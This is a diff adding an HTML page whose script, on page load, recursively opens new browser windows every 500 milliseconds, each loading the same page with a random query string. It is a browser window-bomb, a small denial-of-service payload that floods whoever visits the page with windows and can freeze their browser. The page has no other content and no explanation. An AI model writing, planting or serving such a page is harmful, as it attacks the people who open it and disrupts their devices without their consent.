@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+</head>
+<body>
+    
+    <script>
+        (function bomb(timeouut= 500, i = 0){
+            setTimeout(()=> {
+                window.open('./?v='+Math.random(),'_new'+(i || ''))
+                bomb(timeouut, i+1)
+
+            }, timeouut)
+        })()
+    </script>
+</body>
+</html>
